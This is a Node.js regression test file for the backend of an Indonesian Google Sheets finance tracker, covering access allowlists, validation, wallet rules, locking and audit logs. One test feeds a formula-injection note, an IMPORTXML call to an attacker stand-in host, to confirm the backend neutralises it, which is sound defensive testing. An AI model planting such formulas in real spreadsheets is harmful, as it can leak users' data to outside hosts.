/**
 * tests/backend/backend.test.js
 * Regresi backend produk ASLI (D-21) - dijalankan dengan `npm run test:backend`.
 * Setiap tes meniru skenario temuan di docs/05_LAPORAN_QC_PRODUCT_TESTING.md
 * dan memverifikasi perbaikannya pada src/backend/*.js (bukan pada mock demo).
 */
"use strict";

const test = require("node:test");
const assert = require("node:assert/strict");
const fs = require("fs");
const path = require("path");
const { createHarness, baseSheets, localDateStr } = require("./harness");

const ROOT = path.resolve(__dirname, "..", "..");
const ALLOW = { ALLOWED_EMAILS: "owner@example.com" };

/* ========================================================================== *
 * R-01: resolusi template & include (mode manual vs clasp)
 * ========================================================================== */

test("R-01: doGet bekerja pada instalasi datar (Index) dan instalasi clasp (frontend/Index)", () => {
  for (const files of [
    ["Index", "Styles", "App"],
    ["frontend/Index", "frontend/Styles", "frontend/App"],
  ]) {
    const h = createHarness({ sheets: baseSheets(), templateFiles: files, properties: ALLOW });
    const out = h.sandbox.doGet({});
    assert.ok(out, `doGet harus menghasilkan output untuk ${files[0]}`);
    assert.equal(typeof h.sandbox.openAppDialog, "function");
    assert.doesNotThrow(() => h.sandbox.openAppDialog());
    assert.equal(h.uiLog.modals.length, 1);
    // Ukuran dialog 1080x720 sesuai kode (R-20 mengklaim 980x680).
    assert.ok(h.uiLog.modals[0].html);
  }
});

test("R-01: include() jatuh balik dari frontend/X ke X", () => {
  const flat = createHarness({ templateFiles: ["Index", "Styles", "App"], properties: ALLOW });
  assert.equal(flat.sandbox.include("frontend/Styles"), "<!-- Styles -->");

  const nested = createHarness({
    templateFiles: ["frontend/Index", "frontend/Styles", "frontend/App"],
    properties: ALLOW,
  });
  assert.equal(nested.sandbox.include("frontend/Styles"), "<!-- frontend/Styles -->");
});

test("R-01: pesan error jelas bila template tidak ada sama sekali", () => {
  const h = createHarness({ templateFiles: [], properties: ALLOW });
  assert.throws(() => h.sandbox.doGet({}), /Template frontend tidak ditemukan/);
});

/* ========================================================================== *
 * R-02 / R-21: whitelist email & manifest
 * ========================================================================== */

test("R-02: doGet menolak email yang tidak terdaftar", () => {
  const h = createHarness({
    sheets: baseSheets(),
    email: "intruder@example.com",
    properties: {}, // tanpa allowlist
  });
  assert.throws(() => h.sandbox.doGet({}), /Akses ditolak/);
});

test("R-02: apiDispatcher menolak aksi saat email tidak terdaftar", () => {
  const h = createHarness({
    sheets: baseSheets(),
    email: "intruder@example.com",
    properties: {},
  });
  const res = h.sandbox.apiDispatcher("getDashboard", {});
  assert.equal(res.success, false);
  assert.match(res.error, /Akses ditolak/);
  assert.equal(h.sheetsObj.TRANSAKSI.rows.length, 1);
});

test("R-02: allowlist menerima email terdaftar dan mode ALLOWED_EMAIL_OWNER", () => {
  const listed = createHarness({ sheets: baseSheets(), email: "owner@example.com", properties: ALLOW });
  assert.doesNotThrow(() => listed.sandbox.doGet({}));

  const byOwner = createHarness({
    sheets: baseSheets(),
    email: "owner@example.com",
    properties: { ALLOWED_EMAIL_OWNER: "true" },
  });
  assert.doesNotThrow(() => byOwner.sandbox.doGet({}));
});

test("R-02: pemilik spreadsheet (effective user) otomatis diizinkan tanpa menyetel Script Properties", () => {
  const h = createHarness({
    sheets: baseSheets(),
    email: "mafaa.fikri7@gmail.com",
    ownerEmail: "mafaa.fikri7@gmail.com",
    properties: {}, // kosong tanpa ALLOWED_EMAILS
  });
  assert.doesNotThrow(() => h.sandbox.doGet({}));
  const res = h.sandbox.apiDispatcher("getDashboard", {});
  assert.equal(res.success, true);
});

test("R-02: pemilik spreadsheet bisa dibatasi bila ALLOWED_EMAIL_OWNER=false", () => {
  const h = createHarness({
    sheets: baseSheets(),
    email: "mafaa.fikri7@gmail.com",
    ownerEmail: "mafaa.fikri7@gmail.com",
    properties: { ALLOWED_EMAIL_OWNER: "false" },
  });
  assert.throws(() => h.sandbox.doGet({}), /Akses ditolak/);
});

test("R-21/R-02: manifest menyatu USER_ACCESSING + scope terbatas", () => {
  const rel = "src/appsscript.json";
  const manifest = JSON.parse(fs.readFileSync(path.join(ROOT, rel), "utf8"));
  assert.equal(manifest.webapp.executeAs, "USER_ACCESSING", rel);
  assert.equal(manifest.webapp.access, "ANYONE", rel);
  assert.deepEqual(
    manifest.oauthScopes.slice().sort(),
    [
      "https://www.googleapis.com/auth/script.container.ui",
      "https://www.googleapis.com/auth/spreadsheets.currentonly",
      "https://www.googleapis.com/auth/userinfo.email",
    ].sort(),
    rel
  );
  assert.equal(
    manifest.oauthScopes.some((s) => s.endsWith("/auth/spreadsheets")),
    false,
    `${rel}: scope spreadsheets penuh tidak boleh diminta bersama currentonly`
  );
});

/* ========================================================================== *
 * R-03: jalur baca tidak menulis
 * ========================================================================== */

test("R-03: getDashboardData tidak mengubah baris sheet mana pun", () => {
  const sheets = baseSheets({
    DOMPET: [["W-9", "Dompet Mati", "Cash", 0, "Wallet", false]],
  });
  const h = createHarness({ sheets, properties: ALLOW });
  const before = JSON.stringify(h.sandbox.getDashboardData());
  const snapshot = JSON.stringify(h.sheetsObj.DOMPET.rows);

  const d = h.sandbox.getDashboardData();

  assert.equal(JSON.stringify(h.sheetsObj.DOMPET.rows), snapshot, "DOMPET tidak boleh berubah saat membaca");
  // Tidak ada dompet default W-1 yang dibuat diam-diam (bug asli R-03).
  assert.equal(h.sheetsObj.DOMPET.rows.length, 2, "jumlah baris DOMPET tetap");
  assert.equal(d.wallets.length, 0, "dompet nonaktif tidak ikut daftar aktif");
  assert.equal(d.inactiveWallets.length, 1);
  assert.equal(JSON.stringify(h.sandbox.getDashboardData()), before, "payload baca deterministik");
});

test("R-03: membaca berulang tidak menambah baris sheet transaksi", () => {
  const h = createHarness({ sheets: baseSheets(), properties: ALLOW });
  h.sandbox.getDashboardData();
  h.sandbox.getDashboardData();
  assert.equal(h.sheetsObj.TRANSAKSI.rows.length, 1);
});

/* ========================================================================== *
 * R-04 / R-23: validasi transaksi
 * ========================================================================== */

test("R-04: payload transaksi tidak valid ditolak", () => {
  const sheets = baseSheets({
    DOMPET: [
      ["W-1", "Tunai", "Cash", 0, "Wallet", true],
      ["W-2", "Bank Lama", "Bank", 0, "Bank", false],
    ],
    KATEGORI: [
      ["C-EX-1", "Makan", "Expense", "Coffee"],
      ["C-IN-1", "Gaji", "Income", "Briefcase"],
    ],
  });
  const h = createHarness({ sheets, properties: ALLOW });
  const s = h.sandbox;

  const base = { type: "Expense", amount: 10000, walletId: "W-1", categoryId: "C-EX-1" };

  assert.throws(() => s.createTransaction({ ...base, amount: "abc" }), /angka lebih dari 0/);
  assert.throws(() => s.createTransaction({ ...base, type: "Hacked" }), /Tipe transaksi/);
  assert.throws(() => s.createTransaction({ ...base, date: "05/11/2026" }), /Tanggal transaksi tidak valid/);
  assert.throws(() => s.createTransaction({ ...base, walletId: "W-DOES-NOT-EXIST" }), /Dompet sumber tidak ditemukan/);
  assert.throws(() => s.createTransaction({ ...base, categoryId: "C-IN-1" }), /tidak boleh dipakai/);
  assert.throws(() => s.createTransaction({ ...base, categoryId: "" }), /Kategori wajib dipilih/);
  assert.throws(
    () => s.createTransaction({ type: "Transfer", amount: 1000, walletId: "W-1", destWalletId: "W-1" }),
    /tidak boleh sama/
  );
  assert.throws(
    () => s.createTransaction({ type: "Transfer", amount: 1000, walletId: "W-1", destWalletId: "W-2" }),
    /tidak aktif/
  );

  // Semua percobaan gagal tidak boleh meninggalkan baris data.
  assert.equal(h.sheetsObj.TRANSAKSI.rows.length, 1);
  // Saldo dompet tidak berubah.
  const d = s.getDashboardData();
  assert.equal(d.wallets[0].balance, 0);
});

test("R-04: tanggal valid & transfer sukses menghitung saldo asal dan tujuan", () => {
  const sheets = baseSheets({
    DOMPET: [
      ["W-1", "Tunai", "Cash", 100000, "Wallet", true],
      ["W-2", "Bank", "Bank", 0, "Bank", true],
    ],
    KATEGORI: [["C-EX-1", "Makan", "Expense", "Coffee"]],
  });
  const h = createHarness({ sheets, properties: ALLOW });
  const s = h.sandbox;

  s.createTransaction({ type: "Transfer", amount: 40000, walletId: "W-1", destWalletId: "W-2" });
  const d = s.getDashboardData();
  const byId = Object.fromEntries(d.wallets.map((w) => [w.id, w.balance]));
  assert.equal(byId["W-1"], 60000);
  assert.equal(byId["W-2"], 40000);
  assert.equal(d.netWorth, 100000, "transfer tidak mengubah net worth");
});

test("R-08: tanggal serial/diubah format tetap masuk periode yang benar", () => {
  const sheets = baseSheets({
    DOMPET: [["W-1", "Tunai", "Cash", 0, "Wallet", true]],
    KATEGORI: [["C-EX-1", "Makan", "Expense", "Coffee"]],
    TRANSAKSI: [["TX-OLD", "05/11/2026", "Expense", "W-1", "", "C-EX-1", 75000, "lama", ""]],
  });
  const h = createHarness({ sheets, properties: ALLOW });
  const d = h.sandbox.getDashboardData();
  const tx = d.recentTransactions.find((t) => t.id === "TX-OLD");
  assert.equal(tx.date, "2026-11-05");
  const period = localDateStr().slice(0, 7);
  assert.equal(d.monthSummary.period, period);
});

/* ========================================================================== *
 * R-05: duplikasi kategori per (nama, tipe)
 * ========================================================================== */

test("R-05: kategori nama sama dengan tipe berbeda tidak saling berebut", () => {
  const sheets = baseSheets({ KATEGORI: [["C-IN-1", "Bonus", "Income", "Tag"]] });
  const h = createHarness({ sheets, properties: ALLOW });
  const res = h.sandbox.saveCategory({ name: "Bonus", type: "Expense" });

  assert.equal(res.type, "Expense", "harus membuat kategori Expense, bukan mengembalikan Income");
  assert.notEqual(res.id, "C-IN-1");
  assert.equal(h.sheetsObj.KATEGORI.rows.length, 3, "header + 2 kategori berbeda tipe");

  // Duplikat persis (nama + tipe) tetap dikembalikan tanpa baris baru.
  const again = h.sandbox.saveCategory({ name: "Bonus", type: "Expense" });
  assert.equal(again.id, res.id);
  assert.equal(h.sheetsObj.KATEGORI.rows.length, 3);
});

/* ========================================================================== *
 * R-06: aturan hapus/aktifkan dompet
 * ========================================================================== */

test("R-06: dompet bersaldo negatif tidak bisa dihapus", () => {
  const sheets = baseSheets({
    DOMPET: [
      ["W-1", "Tunai", "Cash", 5000, "Wallet", true],
      ["W-2", "Bank", "Bank", 0, "Bank", true],
    ],
    KATEGORI: [["C-EX-1", "Makan", "Expense", "Coffee"]],
    TRANSAKSI: [["TX-1", localDateStr(), "Expense", "W-1", "", "C-EX-1", 20000, "overspend", ""]],
  });
  const h = createHarness({ sheets, properties: ALLOW });
  const before = h.sandbox.getDashboardData().netWorth;
  assert.ok(before < 0);

  assert.throws(() => h.sandbox.deleteWallet("W-1"), /masih memiliki saldo/);
  assert.equal(h.sheetsObj.DOMPET.rows.length, 3, "baris dompet tetap ada");
  assert.equal(h.sandbox.getDashboardData().netWorth, before, "utang tidak hilang dari net worth");
});

test("R-06: soft delete bila ada riwayat, dan bisa diaktifkan kembali", () => {
  const sheets = baseSheets({
    DOMPET: [
      ["W-1", "Tunai", "Cash", 0, "Wallet", true],
      ["W-2", "Bank", "Bank", 0, "Bank", true],
    ],
    KATEGORI: [["C-EX-1", "Makan", "Expense", "Coffee"]],
    TRANSAKSI: [["TX-1", localDateStr(), "Expense", "W-1", "", "C-EX-1", 0, "nol", ""]],
  });
  const h = createHarness({ sheets, properties: ALLOW });
  const s = h.sandbox;

  assert.doesNotThrow(() => s.deleteWallet("W-1"));
  assert.equal(h.sheetsObj.DOMPET.rows.length, 3, "soft delete: baris tetap untuk riwayat");
  assert.equal(h.sheetsObj.DOMPET.rows[1][5], false, "kolom Aktif menjadi FALSE");

  let d = s.getDashboardData();
  assert.equal(d.wallets.length, 1);
  assert.equal(d.inactiveWallets.length, 1);

  assert.doesNotThrow(() => s.restoreWallet("W-1"));
  d = s.getDashboardData();
  assert.equal(d.wallets.length, 2);
  assert.equal(d.inactiveWallets.length, 0);
});

test("R-06: dompet aktif terakhir tidak bisa dihapus", () => {
  const sheets = baseSheets({ DOMPET: [["W-1", "Tunai", "Cash", 0, "Wallet", true]] });
  const h = createHarness({ sheets, properties: ALLOW });
  assert.throws(() => h.sandbox.deleteWallet("W-1"), /dompet terakhir yang aktif/);
});

test("R-06: dompet tanpa riwayat dan bersaldo nol terhapus permanen", () => {
  const sheets = baseSheets({
    DOMPET: [
      ["W-1", "Tunai", "Cash", 0, "Wallet", true],
      ["W-2", "Bank", "Bank", 0, "Bank", true],
    ],
  });
  const h = createHarness({ sheets, properties: ALLOW });
  assert.doesNotThrow(() => h.sandbox.deleteWallet("W-2"));
  assert.equal(h.sheetsObj.DOMPET.rows.length, 2, "header + W-1");
  assert.equal(h.sheetsObj.AUDIT.rows.length, 2, "R-24: penghapusan tercatat di AUDIT");
});

/* ========================================================================== *
 * R-07 / R-10 / R-24 / R-25: identitas, sanitasi, audit, urutan
 * ========================================================================== */

test("R-07: ID transaksi tidak tabrakan meski dibuat berdekatan", () => {
  const sheets = baseSheets({
    DOMPET: [["W-1", "Tunai", "Cash", 0, "Wallet", true]],
    KATEGORI: [["C-EX-1", "Makan", "Expense", "Coffee"]],
  });
  const h = createHarness({ sheets, properties: ALLOW });
  const ids = new Set();
  for (let i = 0; i < 30; i++) {
    const res = h.sandbox.createTransaction({
      type: "Expense",
      amount: 1000 + i,
      walletId: "W-1",
      categoryId: "C-EX-1",
      date: localDateStr(),
    });
    ids.add(res.id);
  }
  assert.equal(ids.size, 30, "semua ID unik");
  assert.equal(h.sheetsObj.TRANSAKSI.rows.length, 31);
});

test("R-10: catatan berawalan karakter formula diberi prefiks apostrof", () => {
  const sheets = baseSheets({
    DOMPET: [["W-1", "Tunai", "Cash", 0, "Wallet", true]],
    KATEGORI: [["C-EX-1", "Makan", "Expense", "Coffee"]],
  });
  const h = createHarness({ sheets, properties: ALLOW });
  h.sandbox.createTransaction({
    type: "Expense",
    amount: 1,
    walletId: "W-1",
    categoryId: "C-EX-1",
    notes: '=IMPORTXML("http://evil.example/x","//a")',
  });
  const storedNote = h.sheetsObj.TRANSAKSI.rows[1][7];
  assert.ok(String(storedNote).startsWith("'"), `catatan harus dinetralisir: ${storedNote}`);
  assert.equal(String(storedNote).includes("IMPORTXML"), true);
});

test("R-24: hapus transaksi & anggaran menyisipkan jejak AUDIT", () => {
  const sheets = baseSheets({
    DOMPET: [["W-1", "Tunai", "Cash", 0, "Wallet", true]],
    KATEGORI: [["C-EX-1", "Makan", "Expense", "Coffee"]],
    TRANSAKSI: [["TX-1", localDateStr(), "Expense", "W-1", "", "C-EX-1", 5000, "x", ""]],
    ANGGARAN: [["B-1", "C-EX-1", "RECURRING", 100000]],
  });
  const h = createHarness({ sheets, properties: ALLOW });
  h.sandbox.deleteTransaction("TX-1");
  h.sandbox.deleteBudget("B-1");
  const audit = h.sheetsObj.AUDIT;
  assert.ok(audit, "sheet AUDIT dibuat");
  assert.equal(audit.rows.length, 3, "header + 2 aksi");
  assert.equal(audit.rows[1][1], "HAPUS_TRANSAKSI");
  assert.equal(audit.rows[2][1], "HAPUS_ANGGARAN");
});

test("R-25: urutan terbaru memakai tanggal lalu timestamp sebagai tiebreak", () => {
  const sheets = baseSheets({
    DOMPET: [["W-1", "Tunai", "Cash", 0, "Wallet", true]],
    KATEGORI: [["C-EX-1", "Makan", "Expense", "Coffee"]],
    TRANSAKSI: [
      ["TX-A", "2026-01-05", "Expense", "W-1", "", "C-EX-1", 1000, "lama", "2026-01-05T01:00:00.000Z"],
      ["TX-B", "2026-01-05", "Expense", "W-1", "", "C-EX-1", 2000, "lebih baru", "2026-01-05T09:00:00.000Z"],
      ["TX-C", "2026-02-01", "Expense", "W-1", "", "C-EX-1", 3000, "terbaru", "2026-02-01T01:00:00.000Z"],
    ],
  });
  const h = createHarness({ sheets, properties: ALLOW });
  const d = h.sandbox.getDashboardData();
  assert.equal(
    JSON.stringify(d.recentTransactions.map((t) => t.id)),
    JSON.stringify(["TX-C", "TX-B", "TX-A"])
  );
});

/* ========================================================================== *
 * R-08 / R-09 / R-11 / R-14 / R-15 / R-16 / R-17
 * ========================================================================== */

test("R-08: nilai Aktif teks dikoersi menjadi boolean saat dibaca", () => {
  const sheets = baseSheets({ DOMPET: [["W-1", "Tunai", "Cash", 0, "Wallet", "FALSE"]] });
  const h = createHarness({ sheets, properties: ALLOW });
  const d = h.sandbox.getDashboardData();
  assert.equal(d.wallets.length, 0);
  assert.equal(d.inactiveWallets.length, 1);
  assert.equal(h.sheetsObj.DOMPET.rows[1][5], false, "migrasi menulis boolean murni");
});

test("R-09: operasi tulis mengambil dan melepas lock", () => {
  const sheets = baseSheets({
    DOMPET: [["W-1", "Tunai", "Cash", 0, "Wallet", true]],
    KATEGORI: [["C-EX-1", "Makan", "Expense", "Coffee"]],
  });
  const h = createHarness({ sheets, properties: ALLOW });
  h.sandbox.createTransaction({ type: "Expense", amount: 5000, walletId: "W-1", categoryId: "C-EX-1" });
  assert.equal(h.lockLog.acquired, 1);
  assert.equal(h.lockLog.released, 1);

  // Jalur baca tidak mengambil lock tulis.
  const h2 = createHarness({ sheets: baseSheets(), properties: ALLOW });
  h2.sandbox.getDashboardData();
  assert.equal(h2.lockLog.acquired, 0, "R-03: baca tidak mengunci tulis");
});

test("R-09: lock sibuk memberi pesan yang bisa ditindaklanjuti", () => {
  const sheets = baseSheets({
    DOMPET: [["W-1", "Tunai", "Cash", 0, "Wallet", true]],
    KATEGORI: [["C-EX-1", "Makan", "Expense", "Coffee"]],
  });
  const h = createHarness({ sheets, properties: ALLOW, lockMode: "busy" });
  assert.throws(
    () => h.sandbox.createTransaction({ type: "Expense", amount: 5000, walletId: "W-1", categoryId: "C-EX-1" }),
    /Data sedang diproses permintaan lain/
  );
  assert.equal(h.sheetsObj.TRANSAKSI.rows.length, 1, "tidak ada baris tersimpan saat lock gagal");
});

test("R-09: backend tetap berjalan bila LockService tidak tersedia", () => {
  const sheets = baseSheets({
    DOMPET: [["W-1", "Tunai", "Cash", 0, "Wallet", true]],
    KATEGORI: [["C-EX-1", "Makan", "Expense", "Coffee"]],
  });
  const h = createHarness({ sheets, properties: ALLOW, lockMode: "missing" });
  assert.doesNotThrow(() =>
    h.sandbox.createTransaction({ type: "Expense", amount: 5000, walletId: "W-1", categoryId: "C-EX-1" })
  );
});

test("R-11: jumlah transaksi yang dikirim ke klien dibatasi dan total tetap akurat", () => {
  const rows = [];
  const today = localDateStr();
  for (let i = 1; i <= 205; i++) {
    rows.push([`TX-${i}`, today, "Expense", "W-1", "", "C-EX-1", 1000, `tx ${i}`, ""]);
  }
  const sheets = baseSheets({
    DOMPET: [["W-1", "Tunai", "Cash", 0, "Wallet", true]],
    KATEGORI: [["C-EX-1", "Makan", "Expense", "Coffee"]],
    TRANSAKSI: rows,
  });
  const h = createHarness({ sheets, properties: ALLOW });
  const d = h.sandbox.getDashboardData();
  assert.equal(d.recentTransactions.length, 200);
  assert.equal(d.txTotal, 205);
});

test("R-11: apiDispatcher menolak payload berukuran tidak wajar", () => {
  const h = createHarness({ sheets: baseSheets(), properties: ALLOW });
  const res = h.sandbox.apiDispatcher("getDashboard", { blob: "x".repeat(200001) });
  assert.equal(res.success, false);
  assert.match(res.error, /Payload terlalu besar/);
});

test("R-14: ringkasan DASHBOARD diperbarui oleh operasi tulis", () => {
  const sheets = baseSheets({
    DOMPET: [["W-1", "Tunai", "Cash", 0, "Wallet", true]],
    KATEGORI: [["C-EX-1", "Makan", "Expense", "Coffee"]],
  });
  const h = createHarness({ sheets, properties: ALLOW });
  h.sandbox.createTransaction({ type: "Expense", amount: 25000, walletId: "W-1", categoryId: "C-EX-1" });

  const dash = h.sheetsObj.DASHBOARD.rows;
  assert.ok(dash.length >= 7, "DASHBOARD berisi baris ringkasan");
  assert.equal(dash[1][0], "Total Saldo (Net Worth)");
  assert.equal(dash[1][1], -25000);
  assert.equal(dash[3][1], 25000, "Pengeluaran Bulan Ini ikut diperbarui");
});

test("R-15: tab ANGGARAN baru tidak ditanami anggaran contoh", () => {
  const h = createHarness({ sheets: baseSheets(), properties: ALLOW });
  h.sandbox.ensureDatabaseStructure();
  assert.equal(h.sheetsObj.ANGGARAN.rows.length, 1, "hanya header, tanpa seed");
});

test("R-16: anggaran diikat per (kategori, periode) dan divalidasi", () => {
  const sheets = baseSheets({ KATEGORI: [["C-EX-1", "Makan", "Expense", "Coffee"]] });
  const h = createHarness({ sheets, properties: ALLOW });
  const s = h.sandbox;

  s.saveBudget({ categoryId: "C-EX-1", limitAmount: 500000, period: "RECURRING" });
  s.saveBudget({ categoryId: "C-EX-1", limitAmount: 750000, period: "RECURRING" });
  assert.equal(h.sheetsObj.ANGGARAN.rows.length, 2, "diperbarui, bukan duplikat");
  assert.equal(h.sheetsObj.ANGGARAN.rows[1][3], 750000);

  s.saveBudget({ categoryId: "C-EX-1", limitAmount: 100000, period: "2026-11" });
  assert.equal(h.sheetsObj.ANGGARAN.rows.length, 3, "periode berbeda = baris berbeda");

  assert.throws(() => s.saveBudget({ categoryId: "C-EX-1", limitAmount: 0, period: "RECURRING" }), /lebih dari 0/);
  assert.throws(() => s.saveBudget({ categoryId: "C-EX-1", limitAmount: 1000, period: "RECURRING-2026" }), /Periode/);
  assert.throws(() => s.saveBudget({ categoryId: "C-NOPE", limitAmount: 1000 }), /tidak ditemukan/);
});

test("R-17: email ditampilkan dalam bentuk tersamar", () => {
  const h = createHarness({ properties: ALLOW });
  assert.equal(h.sandbox.maskEmailForDisplay_("owner@example.com"), "o***@example.com");
  assert.equal(h.sandbox.maskEmailForDisplay_("Pengguna"), "Pengguna");
});

/* ========================================================================== *
 * R-23: validasi dompet/kategori
 * ========================================================================== */

test("R-23: saveWallet menolak nama kosong, tipe asing, dan saldo non-angka", () => {
  const h = createHarness({ sheets: baseSheets(), properties: ALLOW });
  const s = h.sandbox;

  assert.throws(() => s.saveWallet({ name: "   ", type: "Cash" }), /Nama dompet wajib diisi/);
  assert.throws(() => s.saveWallet({ name: "Bank X", type: "Kripto" }), /Tipe dompet harus/);
  assert.throws(() => s.saveWallet({ name: "Bank X", type: "Bank", initialBalance: "abc" }), /Saldo awal harus berupa angka/);
  assert.equal(h.sheetsObj.DOMPET.rows.length, 1);

  assert.doesNotThrow(() => s.saveWallet({ name: "Bank X", type: "Bank", initialBalance: "1.500.000" }));
  assert.equal(h.sheetsObj.DOMPET.rows[1][3], 1500000, "format ribuan Indonesia dipahami");
});

test("R-23: saveCategory menolak nama kosong dan tipe asing", () => {
  const h = createHarness({ sheets: baseSheets(), properties: ALLOW });
  assert.throws(() => h.sandbox.saveCategory({ name: "", type: "Expense" }), /Nama kategori wajib diisi/);
  assert.throws(() => h.sandbox.saveCategory({ name: "X", type: "Hacked" }), /Tipe kategori/);
  assert.equal(h.sheetsObj.KATEGORI.rows.length, 1);
});

/* ========================================================================== *
 * S-08 (backend): edit transaksi pada dompet nonaktif tetap terbuka
 * ========================================================================== */

test("S-08: edit transaksi lama boleh memakai dompet nonaktif", () => {
  const sheets = baseSheets({
    DOMPET: [
      ["W-1", "Tunai", "Cash", 0, "Wallet", true],
      ["W-2", "Bank Lama", "Bank", 0, "Bank", false],
    ],
    KATEGORI: [["C-EX-1", "Makan", "Expense", "Coffee"]],
    TRANSAKSI: [["TX-1", localDateStr(), "Expense", "W-2", "", "C-EX-1", 1000, "lama", ""]],
  });
  const h = createHarness({ sheets, properties: ALLOW });
  const s = h.sandbox;

  // Transaksi baru pada dompet nonaktif tetap ditolak.
  assert.throws(
    () => s.createTransaction({ type: "Expense", amount: 1000, walletId: "W-2", categoryId: "C-EX-1" }),
    /tidak aktif/
  );

  // Edit transaksi lama dengan dompet sumber tetap W-2 diperbolehkan.
  assert.doesNotThrow(() =>
    s.updateTransaction({
      id: "TX-1",
      type: "Expense",
      amount: 2000,
      walletId: "W-2",
      categoryId: "C-EX-1",
      date: localDateStr(),
      notes: "diedit",
    })
  );
  assert.equal(h.sheetsObj.TRANSAKSI.rows[1][6], 2000);
});

/* ========================================================================== *
 * Penjagaan statis gaya & sandbox (R-13, S-19)
 * ========================================================================== */

test("R-17/R-01: sidebar dibuka dengan lebar 380px dan email tersamar", () => {
  const h = createHarness({ sheets: baseSheets(), templateFiles: ["Index", "Styles", "App"], properties: ALLOW });
  assert.doesNotThrow(() => h.sandbox.openAppSidebar());
  assert.equal(h.uiLog.sidebars.length, 1, "showSidebar dipanggil sekali");
  assert.ok(h.uiLog.alerts.length === 0, "tanpa alert saat sukses");
});

test("R-17: sidebar yang gagal memberi pesan jelas, bukan error mentah", () => {
  const h = createHarness({ sheets: baseSheets(), templateFiles: [], properties: ALLOW });
  assert.doesNotThrow(() => h.sandbox.openAppSidebar());
  assert.equal(h.uiLog.sidebars.length, 0, "tidak ada sidebar yang disajikan");
  assert.match(h.uiLog.alerts.join(" "), /Sidebar hanya dapat dibuka dari dalam Google Sheets/);
});

test("R-22: runManualSetup melapor sukses dan menggagalkan dengan pesan jelas", () => {
  const h = createHarness({ sheets: baseSheets(), properties: ALLOW });
  const toastLog = [];
  h.sandbox.SpreadsheetApp.getActiveSpreadsheet().toast = (...args) => toastLog.push(args[0]);
  assert.doesNotThrow(() => h.sandbox.runManualSetup());
  assert.match(toastLog[0], /Database siap/);

  // Galat migrasi harus terlaporkan, bukan toast sukses palsu.
  const h2 = createHarness({ sheets: baseSheets(), properties: ALLOW });
  h2.sandbox.SpreadsheetApp.getActiveSpreadsheet().toast = (...args) => toastLog.push(args[0]);
  h2.sandbox.ensureDatabaseStructure = () => {
    throw new Error("spreadsheet terkunci");
  };
  assert.throws(() => h2.sandbox.runManualSetup(), /spreadsheet terkunci/);
  assert.match(toastLog[1], /GAGAL/);
});

test("R-13: CSS tidak lagi menyembunyikan tombol aksi", () => {
  const styles = fs.readFileSync(path.join(ROOT, "src", "frontend", "Styles.html"), "utf8");
  assert.equal(
    /\.section-actions\s*\{\s*display:\s*none\s*!important;\s*\}/.test(styles),
    false,
    ".section-actions tidak boleh disembunyikan"
  );
  assert.match(styles, /body\.SIDEBAR \.section-actions\s*\{[^}]*display:\s*grid/s);
});

test("API: apiDispatcher mendukung seluruh rute aksi API dengan payload yang sesuai", () => {
  const sheets = baseSheets({
    DOMPET: [["W-1", "Tunai", "Cash", 100000, "Wallet", true]],
    KATEGORI: [
      ["C-EX-1", "Makan", "Expense", "Coffee"],
      ["C-IN-1", "Gaji", "Income", "Briefcase"],
    ],
  });
  const h = createHarness({ sheets, properties: ALLOW });

  // 1. getDashboard
  const resGet = h.sandbox.apiDispatcher("getDashboard", {});
  assert.equal(resGet.success, true);
  assert.ok(resGet.data.monthSummary);

  // 2. createTransaction
  const resCreate = h.sandbox.apiDispatcher("createTransaction", {
    type: "Expense",
    amount: 25000,
    date: "2026-11-05",
    walletId: "W-1",
    categoryId: "C-EX-1",
    notes: "Uji Rute API",
  });
  assert.equal(resCreate.success, true);
  assert.ok(resCreate.data.id);
  const txId = resCreate.data.id;

  // 3. updateTransaction
  const resUpdate = h.sandbox.apiDispatcher("updateTransaction", {
    id: txId,
    type: "Expense",
    amount: 35000,
    date: "2026-11-05",
    walletId: "W-1",
    categoryId: "C-EX-1",
    notes: "Uji Rute API Diperbarui",
  });
  assert.equal(resUpdate.success, true);
  assert.equal(resUpdate.data.id, txId);

  // 4. deleteTransaction (payload.id)
  const resDelTx = h.sandbox.apiDispatcher("deleteTransaction", { id: txId });
  assert.equal(resDelTx.success, true);

  // 5. saveCategory
  const resCat = h.sandbox.apiDispatcher("saveCategory", {
    name: "Investasi Reksadana",
    type: "Expense",
  });
  assert.equal(resCat.success, true);
  assert.equal(resCat.data.name, "Investasi Reksadana");
  const catId = resCat.data.id;

  // 6. saveBudget
  const resBudget = h.sandbox.apiDispatcher("saveBudget", {
    categoryId: catId,
    limitAmount: 750000,
  });
  assert.equal(resBudget.success, true);
  assert.ok(resBudget.data.id);
  const budgetId = resBudget.data.id;

  // 7. deleteBudget (payload.id)
  const resDelBudget = h.sandbox.apiDispatcher("deleteBudget", { id: budgetId });
  assert.equal(resDelBudget.success, true);

  // 8. saveWallet
  const resWallet = h.sandbox.apiDispatcher("saveWallet", {
    name: "OVO Transaksi",
    type: "E-Wallet",
    initialBalance: 0,
  });
  assert.equal(resWallet.success, true);
  const wId = resWallet.data.id;

  // 9. deleteWallet (payload.id) & restoreWallet (payload.id)
  // Beri transaksi lalu kembalikan saldo 0 agar menjadi soft delete
  h.sandbox.createTransaction({
    type: "Income",
    amount: 50000,
    date: "2026-11-05",
    walletId: wId,
    categoryId: "C-IN-1",
    notes: "Isi saldo OVO",
  });
  h.sandbox.createTransaction({
    type: "Expense",
    amount: 50000,
    date: "2026-11-05",
    walletId: wId,
    categoryId: "C-EX-1",
    notes: "Pakai habis OVO",
  });
  const resDelWallet = h.sandbox.apiDispatcher("deleteWallet", { id: wId });
  assert.equal(resDelWallet.success, true);

  const resRestore = h.sandbox.apiDispatcher("restoreWallet", { id: wId });
  assert.equal(resRestore.success, true);
  assert.equal(resRestore.data.id, wId);

  // 10. unknownAction
  const resUnknown = h.sandbox.apiDispatcher("perintahAsing", {});
  assert.equal(resUnknown.success, false);
  assert.match(resUnknown.error, /tidak dikenali/);
});

test("UI: onOpen mendaftarkan menu spreadsheet Finance Tracker dengan item lengkap", () => {
  const h = createHarness({ sheets: baseSheets(), properties: ALLOW });
  h.sandbox.onOpen();

  assert.equal(h.uiLog.menus.length, 1);
  const menu = h.uiLog.menus[0];
  assert.equal(menu.caption, "Finance Tracker");
  assert.equal(menu.items.length, 3);
  assert.equal(menu.items[0].caption, "Buka Finance Tracker (Jendela Pop-up)");
  assert.equal(menu.items[0].functionName, "openAppDialog");
  assert.equal(menu.items[1].caption, "Buka Finance Tracker (Sidebar Kanan)");
  assert.equal(menu.items[1].functionName, "openAppSidebar");
  assert.equal(menu.items[2].caption, "Periksa / Inisialisasi Database");
  assert.equal(menu.items[2].functionName, "runManualSetup");
});

